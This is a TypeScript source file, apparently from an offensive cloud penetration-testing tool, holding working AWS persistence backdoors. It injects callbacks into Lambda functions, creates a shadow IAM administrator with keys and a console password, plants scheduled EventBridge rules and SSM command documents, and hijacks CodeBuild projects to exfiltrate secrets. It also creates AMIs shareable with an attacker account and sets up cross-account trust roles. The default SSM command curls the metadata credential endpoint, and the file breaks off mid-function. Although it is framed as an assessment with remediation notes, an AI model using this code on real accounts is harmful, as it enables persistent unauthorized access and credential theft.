import { aws, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function lambdaBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const funcName = argVal(args, "--function-name")
  const callbackUrl = argVal(args, "--callback-url")
  const method = argVal(args, "--method") || "inject"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
  const output: string[] = ["[*] Lambda Backdoor Assessment\n"]

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const identity = tryJson(id.stdout) || {}
  const callerArn = identity.Arn || ""
  output.push(`[+] Identity: ${callerArn}`)

  const actions = method === "inject"
    ? ["lambda:GetFunction", "lambda:UpdateFunctionCode", "lambda:UpdateFunctionConfiguration"]
    : ["lambda:CreateFunction", "iam:PassRole"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
  const results = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
  const denied = actions.filter(a => !allowed.includes(a))

  output.push(`\n[*] Pre-flight permission check:`)
  for (const a of actions) output.push(`  ${allowed.includes(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  if (denied.length > 0) {
    output.push(`\n[-] Missing permissions: ${denied.join(", ")} — persistence vector BLOCKED`)
    findings.push({ checkId: "AWS-PERSIST-LAMBDA-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: `Lambda ${method} backdoor blocked — missing ${denied.join(", ")}`, details: `Cannot perform lambda persistence via ${method}`, remediation: "N/A — insufficient permissions" })
    return { output: output.join("\n"), findings }
  }

  output.push(`\n[+] All required permissions ALLOWED — vector VIABLE`)
  output.push(`[*] CloudTrail events: UpdateFunctionCode20150331v2, UpdateFunctionConfiguration20150331v2`)
  output.push(`[*] GuardDuty: Possible UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS`)

  if (!funcName) {
    const funcs = await aws(["lambda", "list-functions", "--query", "Functions[].[FunctionName,Runtime,Role,LastModified]"], profile, region, timeout)
    const fl = tryJson(funcs.stdout) || []
    output.push(`\n[+] Available Lambda functions: ${fl.length}`)
    for (const f of fl.slice(0, 15)) {
      const roleName = (f[2] || "").split("/").pop()
      output.push(`  ${f[0]} (${f[1]}) — role: ${roleName} — ${f[3]}`)
    }
    output.push(`\n[*] Use --function-name <name> --callback-url <url> to target a function`)
    findings.push({ checkId: "AWS-PERSIST-LAMBDA-002", provider: "aws", severity: "critical", status: "READY", resource: `lambda://${fl.length}-functions`, title: `Lambda code injection viable on ${fl.length} functions`, details: `Identity has UpdateFunctionCode — can inject code into any accessible Lambda`, remediation: "Restrict lambda:UpdateFunctionCode to CI/CD roles, enable code signing" })
    return { output: output.join("\n"), findings }
  }

  if (!callbackUrl) return { output: output.join("\n") + "\n[*] Use --callback-url <url> for exfil endpoint", findings }

  if (method === "inject") {
    const r = await aws(["lambda", "get-function", "--function-name", funcName], profile, region, timeout)
    if (r.exitCode !== 0) return { output: `[-] Function not found: ${r.stderr.trim()}`, findings }
    const func = tryJson(r.stdout)
    const cfg = func?.Configuration || {}
    const roleArn = cfg.Role || ""
    output.push(`\n[*] Target: ${funcName}`)
    output.push(`  Runtime: ${cfg.Runtime}, Handler: ${cfg.Handler}, Code: ${cfg.CodeSize} bytes`)
    output.push(`  Role: ${roleArn}`)

    const roleName = roleArn.split("/").pop() || ""
    if (roleName) {
      const rolePolicies = await aws(["iam", "list-attached-role-policies", "--role-name", roleName, "--query", "AttachedPolicies[].PolicyName"], profile, region, timeout)
      const policies = tryJson(rolePolicies.stdout) || []
      output.push(`  Attached policies: ${policies.join(", ") || "none"}`)
      const isHighPriv = policies.some((p: string) => /AdministratorAccess|PowerUserAccess|FullAccess/.test(p))
      if (isHighPriv) output.push(`  [!!] HIGH-PRIV ROLE — code injection gives admin access`)
    }

    if (cfg.VpcConfig?.SubnetIds?.length > 0) {
      output.push(`  VPC: ${cfg.VpcConfig.VpcId} (${cfg.VpcConfig.SubnetIds.length} subnets) — lateral movement possible`)
    }

    output.push(`\n[+] Steps:`)
    output.push(`  1. aws lambda get-function --function-name ${funcName} --query Code.Location | xargs curl -o code.zip`)
    output.push(`  2. Inject callback to ${callbackUrl} in handler`)
    output.push(`  3. aws lambda update-function-code --function-name ${funcName} --zip-file fileb://code.zip`)

    findings.push({ checkId: "AWS-PERSIST-LAMBDA-003", provider: "aws", severity: "critical", status: "READY", resource: `lambda://${funcName}`, title: `Lambda backdoor ready: ${funcName}`, details: `Runtime: ${cfg.Runtime}, Role: ${roleName}, callback: ${callbackUrl}`, remediation: `Audit function code, enable code signing, restrict UpdateFunctionCode` })
  } else {
    output.push(`\n[*] Create mode — new function '${funcName}' with callback to ${callbackUrl}`)
    output.push(`[+] aws lambda create-function --function-name ${funcName} --runtime python3.11 --handler index.handler --role <role-arn> --zip-file fileb://payload.zip`)

    findings.push({ checkId: "AWS-PERSIST-LAMBDA-003", provider: "aws", severity: "critical", status: "PLANNED", resource: `lambda://${funcName}`, title: `Lambda creation backdoor planned: ${funcName}`, details: `New function with callback to ${callbackUrl}`, remediation: `Delete: aws lambda delete-function --function-name ${funcName}` })
  }

  return { output: output.join("\n"), findings }
}

export async function iamBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const username = argVal(args, "--user-name") || `cs-shadow-${Date.now().toString(36)}`
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] IAM Shadow Admin Backdoor\n"]
  const findings: Finding[] = []

  const createUser = await aws(
    ["iam", "create-user", "--user-name", username, "--tags", "Key=CreatedBy,Value=CyberStrike"],
    profile,
    region,
    timeout,
  )
  if (createUser.exitCode !== 0) {
    output.push(`[-] User creation failed: ${createUser.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  output.push(`[+] User created: ${username}`)

  const attach = await aws(
    [
      "iam",
      "attach-user-policy",
      "--user-name",
      username,
      "--policy-arn",
      "arn:aws:iam::aws:policy/AdministratorAccess",
    ],
    profile,
    region,
    timeout,
  )
  if (attach.exitCode === 0) output.push(`[+] AdministratorAccess attached`)
  else output.push(`[-] Policy attach failed: ${attach.stderr.trim()}`)

  const key = await aws(["iam", "create-access-key", "--user-name", username], profile, region, timeout)
  if (key.exitCode === 0) {
    const ak = tryJson(key.stdout)?.AccessKey
    output.push(`[+] Access Key: ${ak?.AccessKeyId}`)
    output.push(`[+] Secret Key: ${ak?.SecretAccessKey}`)
  }

  const pw = `CyStr!ke${Date.now().toString(36)}`
  const login = await aws(
    ["iam", "create-login-profile", "--user-name", username, "--password", pw, "--no-password-reset-required"],
    profile,
    region,
    timeout,
  )
  if (login.exitCode === 0) output.push(`[+] Console password: ${pw}`)

  findings.push({
    checkId: "AWS-PERSIST-001",
    provider: "aws",
    severity: "critical",
    status: "CREATED",
    resource: `iam:${username}`,
    title: `Shadow admin created: ${username}`,
    details: `IAM user with AdministratorAccess, access key, and console login`,
    remediation: "Delete user: aws iam delete-user --user-name " + username,
  })

  return { output: output.join("\n"), findings }
}

export async function eventbridgeBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const ruleName = argVal(args, "--rule-name") || `cs-rule-${Date.now().toString(36)}`
  const schedule = argVal(args, "--schedule") || "rate(1 hour)"
  const targetArn = argVal(args, "--target-arn")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const execute = hasFlag(args, "--execute")
  const output: string[] = ["[*] EventBridge Backdoor Assessment\n"]
  const findings: Finding[] = []

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""

  const simActions = ["events:PutRule", "events:PutTargets", "events:DeleteRule", "events:RemoveTargets"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
  const simResults = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = simResults.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)

  output.push(`[*] Pre-flight permissions:`)
  for (const a of simActions) output.push(`  ${allowed.includes(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  const canCreate = allowed.includes("events:PutRule") && allowed.includes("events:PutTargets")
  if (!canCreate) {
    output.push(`\n[-] Cannot create rules/targets — EventBridge persistence BLOCKED`)
    findings.push({ checkId: "AWS-PERSIST-EB-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "EventBridge backdoor blocked", details: `Missing: ${simActions.filter(a => !allowed.includes(a)).join(", ")}`, remediation: "N/A" })
    return { output: output.join("\n"), findings }
  }

  output.push(`\n[+] EventBridge persistence VIABLE`)
  output.push(`[*] CloudTrail: PutRule, PutTargets (events.amazonaws.com)`)
  output.push(`[*] Detection: look for rules with unknown names or CyberStrike tags`)

  const rules = await aws(["events", "list-rules", "--query", "Rules[].[Name,State,ScheduleExpression,EventBusName]"], profile, region, timeout)
  const rl = rules.exitCode === 0 ? tryJson(rules.stdout) || [] : []
  output.push(`\n[+] Existing Rules: ${rl.length}`)
  for (const r of rl) {
    output.push(`  ${r[0]} — ${r[1]} — ${r[2] || "event-pattern"} (${r[3]})`)
    const targets = await aws(["events", "list-targets-by-rule", "--rule", r[0] as string, "--query", "Targets[].[Id,Arn]"], profile, region, timeout)
    const tl = targets.exitCode === 0 ? tryJson(targets.stdout) || [] : []
    for (const t of tl) output.push(`    → ${t[1]}`)
  }

  const lambdas = await aws(["lambda", "list-functions", "--query", "Functions[].[FunctionArn,FunctionName]"], profile, region, timeout)
  const ll = lambdas.exitCode === 0 ? tryJson(lambdas.stdout) || [] : []
  if (ll.length > 0) {
    output.push(`\n[+] Available Lambda targets: ${ll.length}`)
    for (const l of ll.slice(0, 5)) output.push(`  ${l[1]} — ${l[0]}`)
  }

  if (!targetArn) {
    output.push(`\n[*] Use --target-arn <lambda-arn> --execute to create scheduled backdoor`)
    output.push(`[*] Options: --schedule 'rate(1 hour)' | 'rate(5 minutes)' | 'cron(0 12 * * ? *)'`)
    findings.push({ checkId: "AWS-PERSIST-EB-002", provider: "aws", severity: "high", status: "READY", resource: `events://viable`, title: `EventBridge scheduled persistence viable — ${ll.length} Lambda targets available`, details: `Can create scheduled rules triggering any Lambda/SSM target`, remediation: "Restrict events:PutRule, events:PutTargets via IAM policy" })
    return { output: output.join("\n"), findings }
  }

  if (!execute) {
    output.push(`\n[*] DRY RUN — would create rule "${ruleName}" → ${targetArn} on ${schedule}`)
    output.push(`[*] Pass --execute to create`)
    return { output: output.join("\n"), findings }
  }

  const create = await aws(["events", "put-rule", "--name", ruleName, "--schedule-expression", schedule, "--state", "ENABLED", "--description", "CyberStrike persistence", "--tags", "Key=CreatedBy,Value=CyberStrike"], profile, region, timeout)
  if (create.exitCode !== 0) {
    output.push(`[-] Rule creation failed: ${create.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  output.push(`\n[+] Rule created: ${ruleName} (${schedule})`)

  const target = await aws(["events", "put-targets", "--rule", ruleName, "--targets", JSON.stringify([{ Id: "cs-target", Arn: targetArn }])], profile, region, timeout)
  if (target.exitCode === 0) output.push(`[+] Target set: ${targetArn}`)
  else output.push(`[-] Target set failed: ${target.stderr.trim()}`)

  output.push(`\n[+] Cleanup: aws events remove-targets --rule ${ruleName} --ids cs-target && aws events delete-rule --name ${ruleName}`)

  findings.push({ checkId: "AWS-PERSIST-EB-003", provider: "aws", severity: "critical", status: "CREATED", resource: `events:${ruleName}`, title: `EventBridge scheduled backdoor: ${ruleName}`, details: `Rule triggers ${targetArn} every ${schedule}`, remediation: `aws events remove-targets --rule ${ruleName} --ids cs-target && aws events delete-rule --name ${ruleName}` })

  return { output: output.join("\n"), findings }
}

export async function ssmDocumentBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const docName = argVal(args, "--document-name") || `cs-doc-${Date.now().toString(36)}`
  const command = argVal(args, "--command") || "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const execute = hasFlag(args, "--execute")
  const output: string[] = ["[*] SSM Document Backdoor Assessment\n"]
  const findings: Finding[] = []

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""

  const simActions = ["ssm:CreateDocument", "ssm:SendCommand", "ssm:UpdateDocument", "ssm:DescribeInstanceInformation"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
  const simResults = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = simResults.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)

  output.push(`[*] Pre-flight permissions:`)
  for (const a of simActions) output.push(`  ${allowed.includes(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  const canCreate = allowed.includes("ssm:CreateDocument")
  const canSend = allowed.includes("ssm:SendCommand")
  if (!canCreate && !canSend) {
    output.push(`\n[-] Cannot create documents or send commands — SSM persistence BLOCKED`)
    findings.push({ checkId: "AWS-PERSIST-SSM-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "SSM document backdoor blocked", details: `Missing: ${simActions.filter(a => !allowed.includes(a)).join(", ")}`, remediation: "N/A" })
    return { output: output.join("\n"), findings }
  }

  output.push(`\n[+] SSM persistence VIABLE — create: ${canCreate ? "YES" : "NO"}, send: ${canSend ? "YES" : "NO"}`)
  output.push(`[*] CloudTrail: CreateDocument, SendCommand, StartSession`)
  output.push(`[*] GuardDuty: N/A (SSM commands not directly monitored)`)

  const instances = await aws(["ssm", "describe-instance-information", "--query", "InstanceInformationList[].[InstanceId,PingStatus,PlatformType,PlatformName,AgentVersion]"], profile, region, timeout)
  const il = instances.exitCode === 0 ? tryJson(instances.stdout) || [] : []
  output.push(`\n[+] SSM-managed instances: ${il.length}`)
  const online = il.filter((i: unknown[]) => i[1] === "Online")
  output.push(`[+] Online: ${online.length}`)
  for (const i of online.slice(0, 15)) output.push(`  ${i[0]} — ${i[1]} — ${i[2]}/${i[3]} — agent ${i[4]}`)

  const docs = await aws(["ssm", "list-documents", "--document-filter-list", "key=Owner,value=Self", "--query", "DocumentIdentifiers[].[Name,DocumentType,PlatformTypes]"], profile, region, timeout)
  const dl = docs.exitCode === 0 ? tryJson(docs.stdout) || [] : []
  output.push(`\n[+] Custom SSM Documents: ${dl.length}`)
  for (const d of dl) output.push(`  ${d[0]} (${d[1]}) — ${(d[2] || []).join(",")}`)

  if (canSend && online.length > 0) {
    findings.push({ checkId: "AWS-PERSIST-SSM-002", provider: "aws", severity: "critical", status: "READY", resource: `ssm://${online.length}-instances`, title: `SSM command execution viable on ${online.length} instances`, details: `SendCommand allowed + ${online.length} online instances — arbitrary code execution`, remediation: "Restrict ssm:SendCommand to specific documents and instance tags" })
  }

  if (!execute) {
    if (canCreate) output.push(`\n[*] Use --execute to create document "${docName}" with command: ${command}`)
    if (canSend && online.length > 0) {
      output.push(`[*] Quick exec (no document needed): aws ssm send-command --document-name AWS-RunShellScript --parameters commands='["${command}"]' --instance-ids ${(online[0] as string[])[0]}`)
    }
    return { output: output.join("\n"), findings }
  }

  if (!canCreate) {
    output.push(`\n[-] Cannot create document — use send-command with built-in AWS-RunShellScript instead`)
    return { output: output.join("\n"), findings }
  }

  const content = JSON.stringify({ schemaVersion: "2.2", description: "CyberStrike persistence document", mainSteps: [{ action: "aws:runShellScript", name: "runCommand", inputs: { runCommand: [command] } }] })
  const create = await aws(["ssm", "create-document", "--name", docName, "--document-type", "Command", "--content", content, "--document-format", "JSON", "--tags", "Key=CreatedBy,Value=CyberStrike"], profile, region, timeout)
  if (create.exitCode !== 0) {
    output.push(`[-] Document creation failed: ${create.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  output.push(`\n[+] Document created: ${docName}`)
  output.push(`[*] Execute: aws ssm send-command --document-name ${docName} --instance-ids <ID>`)
  output.push(`[*] Cleanup: aws ssm delete-document --name ${docName}`)

  findings.push({ checkId: "AWS-PERSIST-SSM-003", provider: "aws", severity: "critical", status: "CREATED", resource: `ssm:doc:${docName}`, title: `SSM document backdoor: ${docName}`, details: `Custom document executes: ${command}. ${online.length} online instances available.`, remediation: `aws ssm delete-document --name ${docName}` })

  return { output: output.join("\n"), findings }
}

export async function codebuildBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const projectName = argVal(args, "--project-name") || `cs-build-${Date.now().toString(36)}`
  const callbackUrl = argVal(args, "--callback-url")
  const roleArn = argVal(args, "--role-arn")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] CodeBuild Backdoor Assessment\n"]
  const findings: Finding[] = []

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const identity = tryJson(id.stdout) || {}
  const callerArn = identity.Arn || ""

  const simActions = ["codebuild:CreateProject", "codebuild:StartBuild", "codebuild:UpdateProject", "iam:PassRole"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
  const simResults = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = simResults.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)

  output.push(`[*] Pre-flight permissions:`)
  for (const a of simActions) output.push(`  ${allowed.includes(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  const canCreate = allowed.includes("codebuild:CreateProject") && allowed.includes("iam:PassRole")
  const canUpdate = allowed.includes("codebuild:UpdateProject")
  if (!canCreate && !canUpdate) {
    output.push(`\n[-] Cannot create or update CodeBuild projects — vector BLOCKED`)
    findings.push({ checkId: "AWS-PERSIST-CB-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "CodeBuild backdoor blocked — insufficient permissions", details: `Missing: ${simActions.filter(a => !allowed.includes(a)).join(", ")}`, remediation: "N/A" })
    return { output: output.join("\n"), findings }
  }

  output.push(`\n[+] CodeBuild persistence ${canCreate ? "CREATE" : ""}${canCreate && canUpdate ? " + " : ""}${canUpdate ? "UPDATE" : ""} VIABLE`)
  output.push(`[*] CloudTrail: CreateProject, StartBuild, UpdateProject`)
  output.push(`[*] GuardDuty: N/A (CodeBuild not monitored by default)`)

  const projects = await aws(["codebuild", "list-projects", "--query", "projects"], profile, region, timeout)
  const pl = projects.exitCode === 0 ? tryJson(projects.stdout) || [] : []
  output.push(`\n[+] Existing Projects: ${pl.length}`)

  const hijackable: string[] = []
  for (const p of pl.slice(0, 15)) {
    const desc = await aws(["codebuild", "batch-get-projects", "--names", p, "--query", "projects[0]"], profile, region, timeout)
    const d = tryJson(desc.stdout) || {}
    const role = d.serviceRole || ""
    const roleName = role.split("/").pop() || ""
    const srcType = d.source?.type || "unknown"
    const envType = d.environment?.type || "unknown"
    const envVars = (d.environment?.environmentVariables || []) as Record<string, string>[]
    const hasSecrets = envVars.some((v: Record<string, string>) => v.type === "SECRETS_MANAGER" || v.type === "PARAMETER_STORE")

    output.push(`  ${p} — role: ${roleName}, src: ${srcType}, env: ${envType}${hasSecrets ? " [HAS SECRETS]" : ""}`)

    if (canUpdate) {
      hijackable.push(p)
      const secretVars = envVars.filter((v: Record<string, string>) => v.type === "SECRETS_MANAGER" || v.type === "PARAMETER_STORE")
      if (secretVars.length > 0) {
        output.push(`    [!] Secrets: ${secretVars.map((v: Record<string, string>) => `${v.name}=${v.value}`).join(", ")}`)
        findings.push({ checkId: "AWS-PERSIST-CB-002", provider: "aws", severity: "high", status: "FAIL", resource: `codebuild://${p}`, title: `CodeBuild ${p} exposes secrets — hijack target`, details: `${secretVars.length} secrets via env vars, role: ${roleName}`, remediation: "Restrict codebuild:UpdateProject, rotate exposed secrets" })
      }

      const attached = await aws(["iam", "list-attached-role-policies", "--role-name", roleName, "--query", "AttachedPolicies[].PolicyName"], profile, region, timeout)
      const policies = tryJson(attached.stdout) || []
      const isHighPriv = policies.some((pol: string) => /AdministratorAccess|PowerUserAccess|FullAccess/.test(pol))
      if (isHighPriv) {
        output.push(`    [!!] HIGH-PRIV ROLE: ${policies.join(", ")} — buildspec injection = admin`)
        findings.push({ checkId: "AWS-PERSIST-CB-003", provider: "aws", severity: "critical", status: "FAIL", resource: `codebuild://${p}`, title: `CodeBuild ${p} has high-priv role — buildspec injection = admin`, details: `Role ${roleName} has ${policies.join(", ")}`, remediation: "Scope down CodeBuild service role to minimum required" })
      }
    }
  }

  if (hijackable.length > 0 && canUpdate) {
    output.push(`\n[+] Hijackable projects (UpdateProject allowed): ${hijackable.length}`)
    output.push(`[*] Attack: modify buildspec to exfil secrets/credentials on next build`)
    output.push(`[*] Command: aws codebuild update-project --name <project> --source-version '' --source type=NO_SOURCE,buildspec='<malicious>'`)
  }

  if (canCreate && roleArn) {
    output.push(`\n[*] Would create CodeBuild project: ${projectName} with role ${roleArn}`)
    output.push(`    aws codebuild create-project --name ${projectName} --service-role ${roleArn} --source type=NO_SOURCE,buildspec='version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - aws sts get-caller-identity\\n      - env | sort' --artifacts type=NO_ARTIFACTS --environment type=LINUX_CONTAINER,computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:7.0`)
    output.push(`    aws codebuild start-build --project-name ${projectName}`)

    findings.push({ checkId: "AWS-PERSIST-CB-004", provider: "aws", severity: "critical", status: "PLANNED", resource: `codebuild://${projectName}`, title: `CodeBuild backdoor planned: ${projectName}`, details: `New project with role ${roleArn}, persistent code execution`, remediation: `Delete: aws codebuild delete-project --name ${projectName}. Restrict codebuild:CreateProject + iam:PassRole` })
  } else if (canCreate && !roleArn) {
    output.push(`\n[*] Use --role-arn <arn> to create new backdoor project`)
  }

  return { output: output.join("\n"), findings }
}

export async function amiBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const instanceId = argVal(args, "--instance-id")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const execute = hasFlag(args, "--execute")
  const output: string[] = ["[*] AMI Backdoor Assessment\n"]
  const findings: Finding[] = []

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""

  const simActions = ["ec2:CreateImage", "ec2:ModifyImageAttribute", "ec2:DescribeImages", "ec2:DescribeInstances"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
  const simResults = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = simResults.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)

  output.push(`[*] Pre-flight permissions:`)
  for (const a of simActions) output.push(`  ${allowed.includes(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  const canCreate = allowed.includes("ec2:CreateImage")
  const canShare = allowed.includes("ec2:ModifyImageAttribute")
  if (!canCreate) {
    output.push(`\n[-] ec2:CreateImage DENIED — AMI backdoor BLOCKED`)
    findings.push({ checkId: "AWS-PERSIST-AMI-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "AMI backdoor blocked — cannot create images", details: "ec2:CreateImage denied", remediation: "N/A" })
    return { output: output.join("\n"), findings }
  }

  output.push(`\n[+] AMI creation VIABLE${canShare ? " + cross-account sharing VIABLE" : ""}`)
  output.push(`[*] CloudTrail: CreateImage, ModifyImageAttribute`)

  const amis = await aws(["ec2", "describe-images", "--owners", "self", "--query", "Images[].[ImageId,Name,State,Public,CreationDate]"], profile, region, timeout)
  const al = amis.exitCode === 0 ? tryJson(amis.stdout) || [] : []
  output.push(`\n[+] Owned AMIs: ${al.length}`)
  const publicAmis = al.filter((a: unknown[]) => a[3])
  if (publicAmis.length > 0) {
    output.push(`[!] PUBLIC AMIs: ${publicAmis.length} — may contain sensitive data`)
    for (const a of publicAmis) {
      output.push(`  [!] ${a[0]} — ${a[1]} [PUBLIC]`)
      findings.push({ checkId: "AWS-PERSIST-AMI-002", provider: "aws", severity: "high", status: "FAIL", resource: `ec2:ami:${a[0]}`, title: `AMI ${a[0]} is publicly shared`, details: `Public AMI "${a[1]}" — may contain secrets, keys, or implants`, remediation: `aws ec2 modify-image-attribute --image-id ${a[0]} --launch-permission "Remove=[{Group=all}]"` })
    }
  }
  for (const a of al.filter((a: unknown[]) => !a[3]).slice(0, 10)) {
    output.push(`  ${a[0]} — ${a[1]} — ${a[2]} — ${a[4]}`)
    if (canShare) {
      const perms = await aws(["ec2", "describe-image-attribute", "--image-id", a[0] as string, "--attribute", "launchPermission"], profile, region, timeout)
      const lp = tryJson(perms.stdout)?.LaunchPermissions || []
      if (lp.length > 0) {
        const shared = lp.map((p: Record<string, string>) => p.UserId || p.Group || "unknown").join(", ")
        output.push(`    [!] Shared with: ${shared}`)
      }
    }
  }

  const instances = await aws(["ec2", "describe-instances", "--filters", "Name=instance-state-name,Values=running", "--query", "Reservations[].Instances[].[InstanceId,InstanceType,State.Name,IamInstanceProfile.Arn,Tags[?Key=='Name']|[0].Value]"], profile, region, timeout)
  const il = instances.exitCode === 0 ? tryJson(instances.stdout) || [] : []
  output.push(`\n[+] Running Instances (snapshot targets): ${il.length}`)
  for (const i of il.slice(0, 15)) {
    const iamRole = i[3] ? (i[3] as string).split("/").pop() : "no-role"
    output.push(`  ${i[0]} (${i[1]}) — ${i[4] || "unnamed"} — role: ${iamRole}`)
  }

  if (!instanceId) {
    output.push(`\n[*] Use --instance-id <id> --execute to create backdoored AMI`)
    if (canShare) output.push(`[*] After creation, share cross-account: aws ec2 modify-image-attribute --image-id <ami> --launch-permission "Add=[{UserId=<account>}]"`)
    if (il.length > 0) {
      findings.push({ checkId: "AWS-PERSIST-AMI-003", provider: "aws", severity: "high", status: "READY", resource: `ec2://${il.length}-instances`, title: `AMI backdoor viable — ${il.length} running instances available`, details: `Can snapshot any running instance into AMI preserving all data + implants${canShare ? "; cross-account sharing also possible" : ""}`, remediation: "Restrict ec2:CreateImage, ec2:ModifyImageAttribute" })
    }
    return { output: output.join("\n"), findings }
  }

  if (!execute) {
    output.push(`\n[*] DRY RUN — pass --execute to create AMI from ${instanceId}`)
    return { output: output.join("\n"), findings }
  }

  const name = `cs-ami-${Date.now().toString(36)}`
  const create = await aws(["ec2", "create-image", "--instance-id", instanceId, "--name", name, "--description", "CyberStrike persistence AMI", "--tag-specifications", "ResourceType=image,Tags=[{Key=CreatedBy,Value=CyberStrike}]"], profile, region, timeout)
  if (create.exitCode !== 0) {
    output.push(`[-] AMI creation failed: ${create.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  const imageId = tryJson(create.stdout)?.ImageId
  output.push(`\n[+] AMI created: ${imageId} from instance ${instanceId}`)
  output.push(`[*] AMI name: ${name}`)
  output.push(`[*] Future launches preserve all disk contents including implants`)
  if (canShare) output.push(`[+] Share: aws ec2 modify-image-attribute --image-id ${imageId} --launch-permission "Add=[{UserId=<attacker-account>}]"`)

  findings.push({ checkId: "AWS-PERSIST-AMI-004", provider: "aws", severity: "critical", status: "CREATED", resource: `ec2:ami:${imageId}`, title: `Backdoored AMI created: ${imageId}`, details: `AMI from ${instanceId} — all data preserved. Cleanup: deregister + delete snapshots`, remediation: `aws ec2 deregister-image --image-id ${imageId}` })

  return { output: output.join("\n"), findings }
}

export async function crossAccountRole(args: string[], timeout: number): Promise<HookResult> {
  const externalAccount = argVal(args, "--external-account")
  const roleName = argVal(args, "--role-name") || `cs-xaccount-${Date.now().toString(36)}`
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] Cross-Account Trust Role\n"]
  const findings: Finding[] = []

  if (!externalAccount) {
    const roles = await aws(["iam", "list-roles", "--query", "Roles[].[RoleName,Arn]"], profile, region, timeout)
    if (roles.exitCode === 0) {
      const rl = tryJson(roles.stdout) || []
      const currentId = await aws(["sts", "get-caller-identity", "--query", "Account"], profile, region, timeout)
      const currentAccount = tryJson(currentId.stdout) || ""
      output.push("[+] Roles with cross-account trust:\n")
      for (const r of rl) {
        const desc = await aws(["iam", "get-role", "--role-name", r[0]], profile, region, timeout)
        if (desc.exitCode === 0) {
          const role = tryJson(desc.stdout)?.Role
          const trust = role?.AssumeRolePolicyDocument
          const statements = trust?.Statement || []
          for (const st of statements) {
            const principal = st.Principal?.AWS || st.Principal?.Service || ""
            const principals = Array.isArray(principal) ? principal : [principal]
            const external = principals.filter((p: string) => p.includes(":root") && !p.includes(currentAccount))
            if (external.length > 0) {
              output.push(`    ${r[0]}: trusts ${external.join(", ")}`)
              findings.push({
                checkId: `AWS-PERSIST-006`,
                provider: "aws",
                severity: "high",
                status: "FOUND",
                resource: r[1],
                title: `Cross-account trust: ${r[0]}`,
                details: `Role trusts external accounts: ${external.join(", ")}`,
                remediation: "Review and restrict cross-account trust relationships",
              })
            }
          }
        }
      }
    }
    output.push("\n[*] Use --external-account ACCOUNT_ID to create cross-account trust role")
    return { output: output.join("\n"), findings }
  }

  const trustPolicy = JSON.stringify({
    Version: "2012-10-17",
    Statement: [
      {
